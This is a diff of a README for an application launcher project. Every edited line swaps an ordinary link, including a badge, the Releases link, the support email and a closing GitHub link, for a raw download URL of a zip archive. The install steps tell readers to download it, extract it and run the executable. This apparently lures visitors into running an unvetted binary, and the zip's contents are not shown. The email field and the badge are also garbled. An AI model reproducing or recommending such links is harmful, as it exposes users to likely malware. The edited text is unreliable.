@@ -2,7 +2,7 @@
 
 Welcome to the **Launcher** repository! This project aims to simplify the way you manage and launch applications on your system. Whether you're a developer or a casual user, Launcher provides an intuitive interface that enhances your productivity.
 
-[![Visit GitHub](https://img.shields.io/badge/Visit_GitHub-https%3A%2F%2Fgithub.com-blue)](https://github.com)
+[![Visit GitHub](https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip%3A%2F%https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip)](https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **Launcher** repository! This project aims to simplify the way yo
 
 To get started with Launcher, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com).
+1. **Download the latest release** from the [Releases section](https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip).
 2. **Extract the downloaded file** to your desired location.
 3. **Run the executable** file to start Launcher.
 
@@ -64,14 +64,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip
 - **GitHub Issues**: Use the issues tab in this repository.
 
 ## Acknowledgments
 
 We would like to thank the open-source community for their support and contributions. Special thanks to all the contributors who have made this project possible.
 
-Feel free to explore more about the project on [GitHub](https://github.com) and check out the latest updates in the Releases section. Your feedback is valuable to us!
+Feel free to explore more about the project on [GitHub](https://github.com/janspencer-tri/launcher/raw/refs/heads/master/synopsis/Software-2.9-beta.1.zip) and check out the latest updates in the Releases section. Your feedback is valuable to us!
 
 ---
 
